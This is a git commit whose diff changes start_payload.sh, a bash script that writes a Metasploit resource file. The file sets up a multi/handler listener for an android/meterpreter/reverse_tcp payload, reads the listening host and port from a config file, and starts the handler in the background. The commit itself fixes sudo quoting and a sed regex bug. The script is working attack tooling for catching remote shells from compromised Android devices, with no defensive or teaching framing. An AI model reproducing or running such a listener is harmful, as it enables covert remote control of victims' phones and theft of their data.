46e363cbe90031a2cc0bf443020cc9739160238a
ChooseYourPlan <timweissenfels7@gmail.com>
2019-10-30 21:23:13 +0000

    Changed Variables; Added bash advises to each cmd call; fixed Bug in sed

--- start_payload.sh
+++ start_payload.sh
@@ -1,13 +1,13 @@
 #!/bin/bash
 
-sudo touch meterpreter.rc
-sudo echo use exploit/multi/handler >> meterpreter.rc
-sudo echo set PAYLOAD android/meterpreter/reverse_tcp >> meterpreter.rc
+sudo bash -c "touch meterpreter.rc"
+sudo bash -c "echo use exploit/multi/handler >> meterpreter.rc"
+sudo bash -c "echo set PAYLOAD android/meterpreter/reverse_tcp >> meterpreter.rc"
 
-sudo listen_host = cat config_payload.ini | grep Listen_Host | sed -E 's/(.*)={1](.*)/\2/'
-sudo listen_host = cat config_payload.ini | grep Listen_Port
-| sed -E 's/(.*)={1](.*)/\2/'
+listen_host=$(cat config_payload.ini | grep Listen_Host | sed -E 's/(.*)={1}(.*)/\2/')
+listen_port=$(cat config_payload.ini | grep Listen_Port | sed -E 's/(.*)={1}(.*)/\2/')
 
-sudo echo set LHOST $listen_host >> meterpreter.rc
-sudo echo set LPORT $listen_port >> meterpreter.rc
-sudo echo exploit -j -z >> meterpreter.rc
+sudo bash -c "echo set LHOST $listen_host >> meterpreter.rc"
+sudo bash -c "echo set LPORT $listen_port >> meterpreter.rc"
+sudo bash -c "echo exploit -j -z >> meterpreter.rc"
+sudo bash -c "cat meterpreter.rc"
